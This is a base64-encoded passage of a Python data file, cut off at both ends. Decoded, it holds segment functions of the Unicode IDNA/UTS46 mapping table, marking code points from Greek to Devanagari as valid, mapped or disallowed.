ceDgwXCcpLFxuICAgICgweDNENywgXCdWXCcpLFxuICAgICgweDNEOCwgXCdNXCcsIFwnXHhjZlx4OTlcJyksXG4gICAgKDB4M0Q5LCBcJ1ZcJyksXG4gICAgKDB4M0RBLCBcJ01cJywgXCdceGNmXHg5YlwnKSxcbiAgICAoMHgzREIsIFwnVlwnKSxcbiAgICAoMHgzREMsIFwnTVwnLCBcJ1x4Y2ZceDlkXCcpLFxuICAgICgweDNERCwgXCdWXCcpLFxuICAgICgweDNERSwgXCdNXCcsIFwnXHhjZlx4OWZcJyksXG4gICAgKDB4M0RGLCBcJ1ZcJyksXG4gICAgKDB4M0UwLCBcJ01cJywgXCdceGNmXHhhMVwnKSxcbiAgICAoMHgzRTEsIFwnVlwnKSxcbiAgICAoMHgzRTIsIFwnTVwnLCBcJ1x4Y2ZceGEzXCcpLFxuICAgICgweDNFMywgXCdWXCcpLFxuICAgICgweDNFNCwgXCdNXCcsIFwnXHhjZlx4YTVcJyksXG4gICAgKDB4M0U1LCBcJ1ZcJyksXG4gICAgKDB4M0U2LCBcJ01cJywgXCdceGNmXHhhN1wnKSxcbiAgICAoMHgzRTcsIFwnVlwnKSxcbiAgICAoMHgzRTgsIFwnTVwnLCBcJ1x4Y2ZceGE5XCcpLFxuICAgICgweDNFOSwgXCdWXCcpLFxuICAgICgweDNFQSwgXCdNXCcsIFwnXHhjZlx4YWJcJyksXG4gICAgKDB4M0VCLCBcJ1ZcJyksXG4gICAgKDB4M0VDLCBcJ01cJywgXCdceGNmXHhhZFwnKSxcbiAgICAoMHgzRUQsIFwnVlwnKSxcbiAgICAoMHgzRUUsIFwnTVwnLCBcJ1x4Y2ZceGFmXCcpLFxuICAgICgweDNFRiwgXCdWXCcpLFxuICAgICgweDNGMCwgXCdNXCcsIFwnXHhjZVx4YmFcJyksXG4gICAgKDB4M0YxLCBcJ01cJywgXCdceGNmXHg4MVwnKSxcbiAgICAoMHgzRjIsIFwnTVwnLCBcJ1x4Y2ZceDgzXCcpLFxuICAgICgweDNGMywgXCdWXCcpLFxuICAgICgweDNGNCwgXCdNXCcsIFwnXHhjZVx4YjhcJyksXG4gICAgKDB4M0Y1LCBcJ01cJywgXCdceGNlXHhiNVwnKSxcbiAgICAoMHgzRjYsIFwnVlwnKSxcbiAgICAoMHgzRjcsIFwnTVwnLCBcJ1x4Y2ZceGI4XCcpLFxuICAgICgweDNGOCwgXCdWXCcpLFxuICAgICgweDNGOSwgXCdNXCcsIFwnXHhjZlx4ODNcJyksXG4gICAgKDB4M0ZBLCBcJ01cJywgXCdceGNmXHhiYlwnKSxcbiAgICAoMHgzRkIsIFwnVlwnKSxcbiAgICAoMHgzRkQsIFwnTVwnLCBcJ1x4Y2RceGJiXCcpLFxuICAgICgweDNGRSwgXCdNXCcsIFwnXHhjZFx4YmNcJyksXG4gICAgKDB4M0ZGLCBcJ01cJywgXCdceGNkXHhiZFwnKSxcbiAgICAoMHg0MDAsIFwnTVwnLCBcJ1x4ZDFceDkwXCcpLFxuICAgICgweDQwMSwgXCdNXCcsIFwnXHhkMVx4OTFcJyksXG4gICAgKDB4NDAyLCBcJ01cJywgXCdceGQxXHg5MlwnKSxcbiAgICBdXG5cbmRlZiBfc2VnXzcoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweDQwMywgXCdNXCcsIFwnXHhkMVx4OTNcJyksXG4gICAgKDB4NDA0LCBcJ01cJywgXCdceGQxXHg5NFwnKSxcbiAgICAoMHg0MDUsIFwnTVwnLCBcJ1x4ZDFceDk1XCcpLFxuICAgICgweDQwNiwgXCdNXCcsIFwnXHhkMVx4OTZcJyksXG4gICAgKDB4NDA3LCBcJ01cJywgXCdceGQxXHg5N1wnKSxcbiAgICAoMHg0MDgsIFwnTVwnLCBcJ1x4ZDFceDk4XCcpLFxuICAgICgweDQwOSwgXCdNXCcsIFwnXHhkMVx4OTlcJyksXG4gICAgKDB4NDBBLCBcJ01cJywgXCdceGQxXHg5YVwnKSxcbiAgICAoMHg0MEIsIFwnTVwnLCBcJ1x4ZDFceDliXCcpLFxuICAgICgweDQwQywgXCdNXCcsIFwnXHhkMVx4OWNcJyksXG4gICAgKDB4NDBELCBcJ01cJywgXCdceGQxXHg5ZFwnKSxcbiAgICAoMHg0MEUsIFwnTVwnLCBcJ1x4ZDFceDllXCcpLFxuICAgICgweDQwRiwgXCdNXCcsIFwnXHhkMVx4OWZcJyksXG4gICAgKDB4NDEwLCBcJ01cJywgXCdceGQwXHhiMFwnKSxcbiAgICAoMHg0MTEsIFwnTVwnLCBcJ1x4ZDBceGIxXCcpLFxuICAgICgweDQxMiwgXCdNXCcsIFwnXHhkMFx4YjJcJyksXG4gICAgKDB4NDEzLCBcJ01cJywgXCdceGQwXHhiM1wnKSxcbiAgICAoMHg0MTQsIFwnTVwnLCBcJ1x4ZDBceGI0XCcpLFxuICAgICgweDQxNSwgXCdNXCcsIFwnXHhkMFx4YjVcJyksXG4gICAgKDB4NDE2LCBcJ01cJywgXCdceGQwXHhiNlwnKSxcbiAgICAoMHg0MTcsIFwnTVwnLCBcJ1x4ZDBceGI3XCcpLFxuICAgICgweDQxOCwgXCdNXCcsIFwnXHhkMFx4YjhcJyksXG4gICAgKDB4NDE5LCBcJ01cJywgXCdceGQwXHhiOVwnKSxcbiAgICAoMHg0MUEsIFwnTVwnLCBcJ1x4ZDBceGJhXCcpLFxuICAgICgweDQxQiwgXCdNXCcsIFwnXHhkMFx4YmJcJyksXG4gICAgKDB4NDFDLCBcJ01cJywgXCdceGQwXHhiY1wnKSxcbiAgICAoMHg0MUQsIFwnTVwnLCBcJ1x4ZDBceGJkXCcpLFxuICAgICgweDQxRSwgXCdNXCcsIFwnXHhkMFx4YmVcJyksXG4gICAgKDB4NDFGLCBcJ01cJywgXCdceGQwXHhiZlwnKSxcbiAgICAoMHg0MjAsIFwnTVwnLCBcJ1x4ZDFceDgwXCcpLFxuICAgICgweDQyMSwgXCdNXCcsIFwnXHhkMVx4ODFcJyksXG4gICAgKDB4NDIyLCBcJ01cJywgXCdceGQxXHg4MlwnKSxcbiAgICAoMHg0MjMsIFwnTVwnLCBcJ1x4ZDFceDgzXCcpLFxuICAgICgweDQyNCwgXCdNXCcsIFwnXHhkMVx4ODRcJyksXG4gICAgKDB4NDI1LCBcJ01cJywgXCdceGQxXHg4NVwnKSxcbiAgICAoMHg0MjYsIFwnTVwnLCBcJ1x4ZDFceDg2XCcpLFxuICAgICgweDQyNywgXCdNXCcsIFwnXHhkMVx4ODdcJyksXG4gICAgKDB4NDI4LCBcJ01cJywgXCdceGQxXHg4OFwnKSxcbiAgICAoMHg0MjksIFwnTVwnLCBcJ1x4ZDFceDg5XCcpLFxuICAgICgweDQyQSwgXCdNXCcsIFwnXHhkMVx4OGFcJyksXG4gICAgKDB4NDJCLCBcJ01cJywgXCdceGQxXHg4YlwnKSxcbiAgICAoMHg0MkMsIFwnTVwnLCBcJ1x4ZDFceDhjXCcpLFxuICAgICgweDQyRCwgXCdNXCcsIFwnXHhkMVx4OGRcJyksXG4gICAgKDB4NDJFLCBcJ01cJywgXCdceGQxXHg4ZVwnKSxcbiAgICAoMHg0MkYsIFwnTVwnLCBcJ1x4ZDFceDhmXCcpLFxuICAgICgweDQzMCwgXCdWXCcpLFxuICAgICgweDQ2MCwgXCdNXCcsIFwnXHhkMVx4YTFcJyksXG4gICAgKDB4NDYxLCBcJ1ZcJyksXG4gICAgKDB4NDYyLCBcJ01cJywgXCdceGQxXHhhM1wnKSxcbiAgICAoMHg0NjMsIFwnVlwnKSxcbiAgICAoMHg0NjQsIFwnTVwnLCBcJ1x4ZDFceGE1XCcpLFxuICAgICgweDQ2NSwgXCdWXCcpLFxuICAgICgweDQ2NiwgXCdNXCcsIFwnXHhkMVx4YTdcJyksXG4gICAgKDB4NDY3LCBcJ1ZcJyksXG4gICAgKDB4NDY4LCBcJ01cJywgXCdceGQxXHhhOVwnKSxcbiAgICAoMHg0NjksIFwnVlwnKSxcbiAgICAoMHg0NkEsIFwnTVwnLCBcJ1x4ZDFceGFiXCcpLFxuICAgICgweDQ2QiwgXCdWXCcpLFxuICAgICgweDQ2QywgXCdNXCcsIFwnXHhkMVx4YWRcJyksXG4gICAgKDB4NDZELCBcJ1ZcJyksXG4gICAgKDB4NDZFLCBcJ01cJywgXCdceGQxXHhhZlwnKSxcbiAgICAoMHg0NkYsIFwnVlwnKSxcbiAgICAoMHg0NzAsIFwnTVwnLCBcJ1x4ZDFceGIxXCcpLFxuICAgICgweDQ3MSwgXCdWXCcpLFxuICAgICgweDQ3MiwgXCdNXCcsIFwnXHhkMVx4YjNcJyksXG4gICAgKDB4NDczLCBcJ1ZcJyksXG4gICAgKDB4NDc0LCBcJ01cJywgXCdceGQxXHhiNVwnKSxcbiAgICAoMHg0NzUsIFwnVlwnKSxcbiAgICAoMHg0NzYsIFwnTVwnLCBcJ1x4ZDFceGI3XCcpLFxuICAgICgweDQ3NywgXCdWXCcpLFxuICAgICgweDQ3OCwgXCdNXCcsIFwnXHhkMVx4YjlcJyksXG4gICAgKDB4NDc5LCBcJ1ZcJyksXG4gICAgKDB4NDdBLCBcJ01cJywgXCdceGQxXHhiYlwnKSxcbiAgICAoMHg0N0IsIFwnVlwnKSxcbiAgICAoMHg0N0MsIFwnTVwnLCBcJ1x4ZDFceGJkXCcpLFxuICAgICgweDQ3RCwgXCdWXCcpLFxuICAgICgweDQ3RSwgXCdNXCcsIFwnXHhkMVx4YmZcJyksXG4gICAgKDB4NDdGLCBcJ1ZcJyksXG4gICAgKDB4NDgwLCBcJ01cJywgXCdceGQyXHg4MVwnKSxcbiAgICAoMHg0ODEsIFwnVlwnKSxcbiAgICAoMHg0OEEsIFwnTVwnLCBcJ1x4ZDJceDhiXCcpLFxuICAgICgweDQ4QiwgXCdWXCcpLFxuICAgICgweDQ4QywgXCdNXCcsIFwnXHhkMlx4OGRcJyksXG4gICAgKDB4NDhELCBcJ1ZcJyksXG4gICAgKDB4NDhFLCBcJ01cJywgXCdceGQyXHg4ZlwnKSxcbiAgICAoMHg0OEYsIFwnVlwnKSxcbiAgICAoMHg0OTAsIFwnTVwnLCBcJ1x4ZDJceDkxXCcpLFxuICAgICgweDQ5MSwgXCdWXCcpLFxuICAgICgweDQ5MiwgXCdNXCcsIFwnXHhkMlx4OTNcJyksXG4gICAgKDB4NDkzLCBcJ1ZcJyksXG4gICAgKDB4NDk0LCBcJ01cJywgXCdceGQyXHg5NVwnKSxcbiAgICAoMHg0OTUsIFwnVlwnKSxcbiAgICAoMHg0OTYsIFwnTVwnLCBcJ1x4ZDJceDk3XCcpLFxuICAgICgweDQ5NywgXCdWXCcpLFxuICAgICgweDQ5OCwgXCdNXCcsIFwnXHhkMlx4OTlcJyksXG4gICAgKDB4NDk5LCBcJ1ZcJyksXG4gICAgKDB4NDlBLCBcJ01cJywgXCdceGQyXHg5YlwnKSxcbiAgICAoMHg0OUIsIFwnVlwnKSxcbiAgICAoMHg0OUMsIFwnTVwnLCBcJ1x4ZDJceDlkXCcpLFxuICAgICgweDQ5RCwgXCdWXCcpLFxuICAgIF1cblxuZGVmIF9zZWdfOCgpIC0+IExpc3RbVW5pb25bVHVwbGVbaW50LCBzdHJdLCBUdXBsZVtpbnQsIHN0ciwgc3RyXV1dOlxuICAgIHJldHVybiBbXG4gICAgKDB4NDlFLCBcJ01cJywgXCdceGQyXHg5ZlwnKSxcbiAgICAoMHg0OUYsIFwnVlwnKSxcbiAgICAoMHg0QTAsIFwnTVwnLCBcJ1x4ZDJceGExXCcpLFxuICAgICgweDRBMSwgXCdWXCcpLFxuICAgICgweDRBMiwgXCdNXCcsIFwnXHhkMlx4YTNcJyksXG4gICAgKDB4NEEzLCBcJ1ZcJyksXG4gICAgKDB4NEE0LCBcJ01cJywgXCdceGQyXHhhNVwnKSxcbiAgICAoMHg0QTUsIFwnVlwnKSxcbiAgICAoMHg0QTYsIFwnTVwnLCBcJ1x4ZDJceGE3XCcpLFxuICAgICgweDRBNywgXCdWXCcpLFxuICAgICgweDRBOCwgXCdNXCcsIFwnXHhkMlx4YTlcJyksXG4gICAgKDB4NEE5LCBcJ1ZcJyksXG4gICAgKDB4NEFBLCBcJ01cJywgXCdceGQyXHhhYlwnKSxcbiAgICAoMHg0QUIsIFwnVlwnKSxcbiAgICAoMHg0QUMsIFwnTVwnLCBcJ1x4ZDJceGFkXCcpLFxuICAgICgweDRBRCwgXCdWXCcpLFxuICAgICgweDRBRSwgXCdNXCcsIFwnXHhkMlx4YWZcJyksXG4gICAgKDB4NEFGLCBcJ1ZcJyksXG4gICAgKDB4NEIwLCBcJ01cJywgXCdceGQyXHhiMVwnKSxcbiAgICAoMHg0QjEsIFwnVlwnKSxcbiAgICAoMHg0QjIsIFwnTVwnLCBcJ1x4ZDJceGIzXCcpLFxuICAgICgweDRCMywgXCdWXCcpLFxuICAgICgweDRCNCwgXCdNXCcsIFwnXHhkMlx4YjVcJyksXG4gICAgKDB4NEI1LCBcJ1ZcJyksXG4gICAgKDB4NEI2LCBcJ01cJywgXCdceGQyXHhiN1wnKSxcbiAgICAoMHg0QjcsIFwnVlwnKSxcbiAgICAoMHg0QjgsIFwnTVwnLCBcJ1x4ZDJceGI5XCcpLFxuICAgICgweDRCOSwgXCdWXCcpLFxuICAgICgweDRCQSwgXCdNXCcsIFwnXHhkMlx4YmJcJyksXG4gICAgKDB4NEJCLCBcJ1ZcJyksXG4gICAgKDB4NEJDLCBcJ01cJywgXCdceGQyXHhiZFwnKSxcbiAgICAoMHg0QkQsIFwnVlwnKSxcbiAgICAoMHg0QkUsIFwnTVwnLCBcJ1x4ZDJceGJmXCcpLFxuICAgICgweDRCRiwgXCdWXCcpLFxuICAgICgweDRDMCwgXCdYXCcpLFxuICAgICgweDRDMSwgXCdNXCcsIFwnXHhkM1x4ODJcJyksXG4gICAgKDB4NEMyLCBcJ1ZcJyksXG4gICAgKDB4NEMzLCBcJ01cJywgXCdceGQzXHg4NFwnKSxcbiAgICAoMHg0QzQsIFwnVlwnKSxcbiAgICAoMHg0QzUsIFwnTVwnLCBcJ1x4ZDNceDg2XCcpLFxuICAgICgweDRDNiwgXCdWXCcpLFxuICAgICgweDRDNywgXCdNXCcsIFwnXHhkM1x4ODhcJyksXG4gICAgKDB4NEM4LCBcJ1ZcJyksXG4gICAgKDB4NEM5LCBcJ01cJywgXCdceGQzXHg4YVwnKSxcbiAgICAoMHg0Q0EsIFwnVlwnKSxcbiAgICAoMHg0Q0IsIFwnTVwnLCBcJ1x4ZDNceDhjXCcpLFxuICAgICgweDRDQywgXCdWXCcpLFxuICAgICgweDRDRCwgXCdNXCcsIFwnXHhkM1x4OGVcJyksXG4gICAgKDB4NENFLCBcJ1ZcJyksXG4gICAgKDB4NEQwLCBcJ01cJywgXCdceGQzXHg5MVwnKSxcbiAgICAoMHg0RDEsIFwnVlwnKSxcbiAgICAoMHg0RDIsIFwnTVwnLCBcJ1x4ZDNceDkzXCcpLFxuICAgICgweDREMywgXCdWXCcpLFxuICAgICgweDRENCwgXCdNXCcsIFwnXHhkM1x4OTVcJyksXG4gICAgKDB4NEQ1LCBcJ1ZcJyksXG4gICAgKDB4NEQ2LCBcJ01cJywgXCdceGQzXHg5N1wnKSxcbiAgICAoMHg0RDcsIFwnVlwnKSxcbiAgICAoMHg0RDgsIFwnTVwnLCBcJ1x4ZDNceDk5XCcpLFxuICAgICgweDREOSwgXCdWXCcpLFxuICAgICgweDREQSwgXCdNXCcsIFwnXHhkM1x4OWJcJyksXG4gICAgKDB4NERCLCBcJ1ZcJyksXG4gICAgKDB4NERDLCBcJ01cJywgXCdceGQzXHg5ZFwnKSxcbiAgICAoMHg0REQsIFwnVlwnKSxcbiAgICAoMHg0REUsIFwnTVwnLCBcJ1x4ZDNceDlmXCcpLFxuICAgICgweDRERiwgXCdWXCcpLFxuICAgICgweDRFMCwgXCdNXCcsIFwnXHhkM1x4YTFcJyksXG4gICAgKDB4NEUxLCBcJ1ZcJyksXG4gICAgKDB4NEUyLCBcJ01cJywgXCdceGQzXHhhM1wnKSxcbiAgICAoMHg0RTMsIFwnVlwnKSxcbiAgICAoMHg0RTQsIFwnTVwnLCBcJ1x4ZDNceGE1XCcpLFxuICAgICgweDRFNSwgXCdWXCcpLFxuICAgICgweDRFNiwgXCdNXCcsIFwnXHhkM1x4YTdcJyksXG4gICAgKDB4NEU3LCBcJ1ZcJyksXG4gICAgKDB4NEU4LCBcJ01cJywgXCdceGQzXHhhOVwnKSxcbiAgICAoMHg0RTksIFwnVlwnKSxcbiAgICAoMHg0RUEsIFwnTVwnLCBcJ1x4ZDNceGFiXCcpLFxuICAgICgweDRFQiwgXCdWXCcpLFxuICAgICgweDRFQywgXCdNXCcsIFwnXHhkM1x4YWRcJyksXG4gICAgKDB4NEVELCBcJ1ZcJyksXG4gICAgKDB4NEVFLCBcJ01cJywgXCdceGQzXHhhZlwnKSxcbiAgICAoMHg0RUYsIFwnVlwnKSxcbiAgICAoMHg0RjAsIFwnTVwnLCBcJ1x4ZDNceGIxXCcpLFxuICAgICgweDRGMSwgXCdWXCcpLFxuICAgICgweDRGMiwgXCdNXCcsIFwnXHhkM1x4YjNcJyksXG4gICAgKDB4NEYzLCBcJ1ZcJyksXG4gICAgKDB4NEY0LCBcJ01cJywgXCdceGQzXHhiNVwnKSxcbiAgICAoMHg0RjUsIFwnVlwnKSxcbiAgICAoMHg0RjYsIFwnTVwnLCBcJ1x4ZDNceGI3XCcpLFxuICAgICgweDRGNywgXCdWXCcpLFxuICAgICgweDRGOCwgXCdNXCcsIFwnXHhkM1x4YjlcJyksXG4gICAgKDB4NEY5LCBcJ1ZcJyksXG4gICAgKDB4NEZBLCBcJ01cJywgXCdceGQzXHhiYlwnKSxcbiAgICAoMHg0RkIsIFwnVlwnKSxcbiAgICAoMHg0RkMsIFwnTVwnLCBcJ1x4ZDNceGJkXCcpLFxuICAgICgweDRGRCwgXCdWXCcpLFxuICAgICgweDRGRSwgXCdNXCcsIFwnXHhkM1x4YmZcJyksXG4gICAgKDB4NEZGLCBcJ1ZcJyksXG4gICAgKDB4NTAwLCBcJ01cJywgXCdceGQ0XHg4MVwnKSxcbiAgICAoMHg1MDEsIFwnVlwnKSxcbiAgICAoMHg1MDIsIFwnTVwnLCBcJ1x4ZDRceDgzXCcpLFxuICAgIF1cblxuZGVmIF9zZWdfOSgpIC0+IExpc3RbVW5pb25bVHVwbGVbaW50LCBzdHJdLCBUdXBsZVtpbnQsIHN0ciwgc3RyXV1dOlxuICAgIHJldHVybiBbXG4gICAgKDB4NTAzLCBcJ1ZcJyksXG4gICAgKDB4NTA0LCBcJ01cJywgXCdceGQ0XHg4NVwnKSxcbiAgICAoMHg1MDUsIFwnVlwnKSxcbiAgICAoMHg1MDYsIFwnTVwnLCBcJ1x4ZDRceDg3XCcpLFxuICAgICgweDUwNywgXCdWXCcpLFxuICAgICgweDUwOCwgXCdNXCcsIFwnXHhkNFx4ODlcJyksXG4gICAgKDB4NTA5LCBcJ1ZcJyksXG4gICAgKDB4NTBBLCBcJ01cJywgXCdceGQ0XHg4YlwnKSxcbiAgICAoMHg1MEIsIFwnVlwnKSxcbiAgICAoMHg1MEMsIFwnTVwnLCBcJ1x4ZDRceDhkXCcpLFxuICAgICgweDUwRCwgXCdWXCcpLFxuICAgICgweDUwRSwgXCdNXCcsIFwnXHhkNFx4OGZcJyksXG4gICAgKDB4NTBGLCBcJ1ZcJyksXG4gICAgKDB4NTEwLCBcJ01cJywgXCdceGQ0XHg5MVwnKSxcbiAgICAoMHg1MTEsIFwnVlwnKSxcbiAgICAoMHg1MTIsIFwnTVwnLCBcJ1x4ZDRceDkzXCcpLFxuICAgICgweDUxMywgXCdWXCcpLFxuICAgICgweDUxNCwgXCdNXCcsIFwnXHhkNFx4OTVcJyksXG4gICAgKDB4NTE1LCBcJ1ZcJyksXG4gICAgKDB4NTE2LCBcJ01cJywgXCdceGQ0XHg5N1wnKSxcbiAgICAoMHg1MTcsIFwnVlwnKSxcbiAgICAoMHg1MTgsIFwnTVwnLCBcJ1x4ZDRceDk5XCcpLFxuICAgICgweDUxOSwgXCdWXCcpLFxuICAgICgweDUxQSwgXCdNXCcsIFwnXHhkNFx4OWJcJyksXG4gICAgKDB4NTFCLCBcJ1ZcJyksXG4gICAgKDB4NTFDLCBcJ01cJywgXCdceGQ0XHg5ZFwnKSxcbiAgICAoMHg1MUQsIFwnVlwnKSxcbiAgICAoMHg1MUUsIFwnTVwnLCBcJ1x4ZDRceDlmXCcpLFxuICAgICgweDUxRiwgXCdWXCcpLFxuICAgICgweDUyMCwgXCdNXCcsIFwnXHhkNFx4YTFcJyksXG4gICAgKDB4NTIxLCBcJ1ZcJyksXG4gICAgKDB4NTIyLCBcJ01cJywgXCdceGQ0XHhhM1wnKSxcbiAgICAoMHg1MjMsIFwnVlwnKSxcbiAgICAoMHg1MjQsIFwnTVwnLCBcJ1x4ZDRceGE1XCcpLFxuICAgICgweDUyNSwgXCdWXCcpLFxuICAgICgweDUyNiwgXCdNXCcsIFwnXHhkNFx4YTdcJyksXG4gICAgKDB4NTI3LCBcJ1ZcJyksXG4gICAgKDB4NTI4LCBcJ01cJywgXCdceGQ0XHhhOVwnKSxcbiAgICAoMHg1MjksIFwnVlwnKSxcbiAgICAoMHg1MkEsIFwnTVwnLCBcJ1x4ZDRceGFiXCcpLFxuICAgICgweDUyQiwgXCdWXCcpLFxuICAgICgweDUyQywgXCdNXCcsIFwnXHhkNFx4YWRcJyksXG4gICAgKDB4NTJELCBcJ1ZcJyksXG4gICAgKDB4NTJFLCBcJ01cJywgXCdceGQ0XHhhZlwnKSxcbiAgICAoMHg1MkYsIFwnVlwnKSxcbiAgICAoMHg1MzAsIFwnWFwnKSxcbiAgICAoMHg1MzEsIFwnTVwnLCBcJ1x4ZDVceGExXCcpLFxuICAgICgweDUzMiwgXCdNXCcsIFwnXHhkNVx4YTJcJyksXG4gICAgKDB4NTMzLCBcJ01cJywgXCdceGQ1XHhhM1wnKSxcbiAgICAoMHg1MzQsIFwnTVwnLCBcJ1x4ZDVceGE0XCcpLFxuICAgICgweDUzNSwgXCdNXCcsIFwnXHhkNVx4YTVcJyksXG4gICAgKDB4NTM2LCBcJ01cJywgXCdceGQ1XHhhNlwnKSxcbiAgICAoMHg1MzcsIFwnTVwnLCBcJ1x4ZDVceGE3XCcpLFxuICAgICgweDUzOCwgXCdNXCcsIFwnXHhkNVx4YThcJyksXG4gICAgKDB4NTM5LCBcJ01cJywgXCdceGQ1XHhhOVwnKSxcbiAgICAoMHg1M0EsIFwnTVwnLCBcJ1x4ZDVceGFhXCcpLFxuICAgICgweDUzQiwgXCdNXCcsIFwnXHhkNVx4YWJcJyksXG4gICAgKDB4NTNDLCBcJ01cJywgXCdceGQ1XHhhY1wnKSxcbiAgICAoMHg1M0QsIFwnTVwnLCBcJ1x4ZDVceGFkXCcpLFxuICAgICgweDUzRSwgXCdNXCcsIFwnXHhkNVx4YWVcJyksXG4gICAgKDB4NTNGLCBcJ01cJywgXCdceGQ1XHhhZlwnKSxcbiAgICAoMHg1NDAsIFwnTVwnLCBcJ1x4ZDVceGIwXCcpLFxuICAgICgweDU0MSwgXCdNXCcsIFwnXHhkNVx4YjFcJyksXG4gICAgKDB4NTQyLCBcJ01cJywgXCdceGQ1XHhiMlwnKSxcbiAgICAoMHg1NDMsIFwnTVwnLCBcJ1x4ZDVceGIzXCcpLFxuICAgICgweDU0NCwgXCdNXCcsIFwnXHhkNVx4YjRcJyksXG4gICAgKDB4NTQ1LCBcJ01cJywgXCdceGQ1XHhiNVwnKSxcbiAgICAoMHg1NDYsIFwnTVwnLCBcJ1x4ZDVceGI2XCcpLFxuICAgICgweDU0NywgXCdNXCcsIFwnXHhkNVx4YjdcJyksXG4gICAgKDB4NTQ4LCBcJ01cJywgXCdceGQ1XHhiOFwnKSxcbiAgICAoMHg1NDksIFwnTVwnLCBcJ1x4ZDVceGI5XCcpLFxuICAgICgweDU0QSwgXCdNXCcsIFwnXHhkNVx4YmFcJyksXG4gICAgKDB4NTRCLCBcJ01cJywgXCdceGQ1XHhiYlwnKSxcbiAgICAoMHg1NEMsIFwnTVwnLCBcJ1x4ZDVceGJjXCcpLFxuICAgICgweDU0RCwgXCdNXCcsIFwnXHhkNVx4YmRcJyksXG4gICAgKDB4NTRFLCBcJ01cJywgXCdceGQ1XHhiZVwnKSxcbiAgICAoMHg1NEYsIFwnTVwnLCBcJ1x4ZDVceGJmXCcpLFxuICAgICgweDU1MCwgXCdNXCcsIFwnXHhkNlx4ODBcJyksXG4gICAgKDB4NTUxLCBcJ01cJywgXCdceGQ2XHg4MVwnKSxcbiAgICAoMHg1NTIsIFwnTVwnLCBcJ1x4ZDZceDgyXCcpLFxuICAgICgweDU1MywgXCdNXCcsIFwnXHhkNlx4ODNcJyksXG4gICAgKDB4NTU0LCBcJ01cJywgXCdceGQ2XHg4NFwnKSxcbiAgICAoMHg1NTUsIFwnTVwnLCBcJ1x4ZDZceDg1XCcpLFxuICAgICgweDU1NiwgXCdNXCcsIFwnXHhkNlx4ODZcJyksXG4gICAgKDB4NTU3LCBcJ1hcJyksXG4gICAgKDB4NTU5LCBcJ1ZcJyksXG4gICAgKDB4NTg3LCBcJ01cJywgXCdceGQ1XHhhNVx4ZDZceDgyXCcpLFxuICAgICgweDU4OCwgXCdWXCcpLFxuICAgICgweDU4QiwgXCdYXCcpLFxuICAgICgweDU4RCwgXCdWXCcpLFxuICAgICgweDU5MCwgXCdYXCcpLFxuICAgICgweDU5MSwgXCdWXCcpLFxuICAgICgweDVDOCwgXCdYXCcpLFxuICAgICgweDVEMCwgXCdWXCcpLFxuICAgICgweDVFQiwgXCdYXCcpLFxuICAgICgweDVFRiwgXCdWXCcpLFxuICAgICgweDVGNSwgXCdYXCcpLFxuICAgICgweDYwNiwgXCdWXCcpLFxuICAgICgweDYxQywgXCdYXCcpLFxuICAgICgweDYxRCwgXCdWXCcpLFxuICAgIF1cblxuZGVmIF9zZWdfMTAoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweDY3NSwgXCdNXCcsIFwnXHhkOFx4YTdceGQ5XHhiNFwnKSxcbiAgICAoMHg2NzYsIFwnTVwnLCBcJ1x4ZDlceDg4XHhkOVx4YjRcJyksXG4gICAgKDB4Njc3LCBcJ01cJywgXCdceGRiXHg4N1x4ZDlceGI0XCcpLFxuICAgICgweDY3OCwgXCdNXCcsIFwnXHhkOVx4OGFceGQ5XHhiNFwnKSxcbiAgICAoMHg2NzksIFwnVlwnKSxcbiAgICAoMHg2REQsIFwnWFwnKSxcbiAgICAoMHg2REUsIFwnVlwnKSxcbiAgICAoMHg3MEUsIFwnWFwnKSxcbiAgICAoMHg3MTAsIFwnVlwnKSxcbiAgICAoMHg3NEIsIFwnWFwnKSxcbiAgICAoMHg3NEQsIFwnVlwnKSxcbiAgICAoMHg3QjIsIFwnWFwnKSxcbiAgICAoMHg3QzAsIFwnVlwnKSxcbiAgICAoMHg3RkIsIFwnWFwnKSxcbiAgICAoMHg3RkQsIFwnVlwnKSxcbiAgICAoMHg4MkUsIFwnWFwnKSxcbiAgICAoMHg4MzAsIFwnVlwnKSxcbiAgICAoMHg4M0YsIFwnWFwnKSxcbiAgICAoMHg4NDAsIFwnVlwnKSxcbiAgICAoMHg4NUMsIFwnWFwnKSxcbiAgICAoMHg4NUUsIFwnVlwnKSxcbiAgICAoMHg4NUYsIFwnWFwnKSxcbiAgICAoMHg4NjAsIFwnVlwnKSxcbiAgICAoMHg4NkIsIFwnWFwnKSxcbiAgICAoMHg4NzAsIFwnVlwnKSxcbiAgICAoMHg4OEYsIFwnWFwnKSxcbiAgICAoMHg4OTgsIFwnVlwnKSxcbiAgICAoMHg4RTIsIFwnWFwnKSxcbiAgICAoMHg4RTMsIFwnVlwnKSxcbiAgICAoMHg5NTgsIFwnTVwnLCBcJ1x4ZTBceGE0XHg5NVx4ZTBceGE0XHhiY1wnKSxcbiAgICAoMHg5NTksIFwnTVwnLCBcJ1x4ZTBceGE0XHg5Nlx4ZTBceGE0XHhiY1wnKSxcbiAgICAoMHg5NUEsIFwnTVwnLCBcJ1x4ZTBceGE0XHg5N1x4ZTBceGE0XHhiY1wnKSxcbiAgICAoMHg5NUIsIFwnTVwnLCBcJ1x4ZTBceGE0XHg5Y1x4ZTBceGE0XHhiY1wnKSxcbiAgICAoMHg5NUMsIFwnTVwnLCBcJ1x4ZTBceGE0XHhhMVx4ZTBceGE0XHhiY1wnKSxcbiAgICAoMHg5NUQsIFwnTVwnLCBcJ1x4ZTBceGE0XHhhMlx4ZTBceGE0XHhiY1wnKSxcbiAgICAoMHg5NUUsIFwnTVwnLCBcJ1x4ZTBceGE0XHhhYlx4ZTBceGE0XHhiY1wnKSxcbiAgICAoMHg5NUYsIFwnTVwnLCBcJ1x4ZTBceGE0XHhhZlx4ZTBceGE0XHhiY1wnKSxcbiAgICAoMHg5NjAsIFwnVlwnKSxcbiAgICAoMHg5ODQsIFwnWFwnKSxcbiAgICAoMHg5ODUsIFwnVlwnKSxcbiAgICAoMHg5OEQsIFwnWFwnKSxcbiAgICAoMHg5OEYsIFwnVlwnKSxcbiAgICAoMHg5OTEsIFwnWFwnKSxcbiAgICAoMHg5OTMsIFwnVlwnKSxcbiAgICAoMHg5QTksIFwnWFwnKSxcbiAgICAoMHg5QUEsIFwnVlwnKSxcbiAgICAoMHg5Qj